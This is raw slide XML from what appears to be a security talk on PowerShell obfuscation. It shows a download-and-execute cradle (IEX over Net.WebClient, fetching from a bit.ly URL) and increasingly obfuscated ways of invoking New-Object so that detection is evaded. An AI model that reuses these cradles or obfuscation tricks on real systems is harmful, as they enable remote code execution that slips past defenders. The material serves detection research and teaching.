              <a:t>IEX (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>).(((</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>PsObject.Methods</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> | Where-Object {$_.Name -like '*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>wn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>*d*g'}).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Name).Invoke(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>'http://bit.ly/L3g1tCrad1e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200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7578" y="4724717"/>
            <a:ext cx="10058400" cy="342413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9" name="Up Arrow 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="3297819" y="3941657"/>
            <a:ext cx="352341" cy="765741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47845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800" dirty="0"/>
              <a:t>Obscure Token Obfuscation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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>Cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> Obfuscation – Alternate syntax to obtain &amp; invoke </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> object</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean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 smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.(COMMAND</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> *w-*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ct</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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540344" y="2372224"/>
            <a:ext cx="9111311" cy="110799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200" dirty="0" smtClean="0"/>
              <a:t>IEX (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>).(((</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>PsObject.Methods</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> | Where-Object {$_.Name -like '*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>wn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>*d*g'}).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Name).Invoke(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>'http://bit.ly/L3g1tCrad1e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200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1346" y="4446793"/>
            <a:ext cx="7290864" cy="1605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1518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800" dirty="0"/>
              <a:t>Obscure Token Obfuscation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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>Cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> Obfuscation – Alternate syntax to obtain &amp; invoke </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> object</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean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 smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.(COMMAND</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> *w-*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ct</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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540344" y="2372224"/>
            <a:ext cx="9111311" cy="110799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200" dirty="0" smtClean="0"/>
              <a:t>IEX (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>).(((</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>PsObject.Methods</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> | Where-Object {$_.Name -like '*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>wn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>*d*g'}).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Name).Invoke(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>'http://bit.ly/L3g1tCrad1e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Up Arrow 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="3564426">
            <a:off x="4548220" y="2176399"/>
            <a:ext cx="352341" cy="2084296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Up Arrow 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2537282" y="2683727"/>
            <a:ext cx="330610" cy="953732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20363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800" dirty="0"/>
              <a:t>Obscure Token Obfuscation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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>Cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> Obfuscation – Alternate syntax to obtain &amp; invoke </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> object</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean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 smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="24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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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540344" y="2372224"/>
            <a:ext cx="9111311" cy="113877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200" dirty="0" smtClean="0"/>
              <a:t>IEX (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.(COMMAND *w-*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ct</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>).(((</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.(COMMAND *w-*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ct</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>PsObject.Methods</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> | Where-Object {$_.Name -like '*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>wn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>*d*g'}).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Name).Invoke(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>'http://bit.ly/L3g1tCrad1e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>')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36985432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800" dirty="0"/>
              <a:t>Obscure Token Obfuscation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796239" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0" err="1" smtClean="0"/>
              <a:t>Cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0" smtClean="0"/>
              <a:t> Obfuscation – Alternate syntax to obtain &amp; invoke </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0" err="1" smtClean="0"/>
              <a:t>cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0" smtClean="0"/>
              <a:t> object</a:t>
            </a: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 smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>PS1.0 Syntax (Obfuscated) for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0"/>
              <a:t>New-Object</a:t>
            </a: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b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&amp;(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GV E*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>onte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*).Value.(((GV E*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>onte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Value|GM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)[6].Name).(((GV E*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>onte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*).Value.(((GV E*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>onte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Value|GM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)[6].Name).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PsObject.Methods|Where</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>{(GCI Variable:_).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Value.Name-ilike</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'*Co*d'}).Name).Invoke((GV E*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>onte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*).Value.(((GV E*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>onte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Value|GM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)[6].Name).(((GV E*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>onte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*).Value.(((GV E*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>onte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Value|GM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)[6].Name)|</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GM|Where</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>{(GCI Variable:_).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Value.Name-ilike'G</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>om</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>*e'}).Name).Invoke('N*ct',$TRUE,1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>), [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>System.Management.Automation.CommandTypes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>]::</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cmdlet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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540344" y="2372224"/>
            <a:ext cx="9111311" cy="113877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200" dirty="0" smtClean="0"/>
              <a:t>IEX (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>.(COMMAND *w-*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>ct</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>).(((</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>.(COMMAND *w-*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>ct</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>PsObject.Methods</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> | Where-Object {$_.Name -like '*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>wn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>*d*g'}).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Name).Invoke(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>'http://bit.ly/L3g1tCrad1e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>')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2191071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800" dirty="0"/>
              <a:t>Obscure Token Obfuscation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796239" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>Cmdlet</a:t>
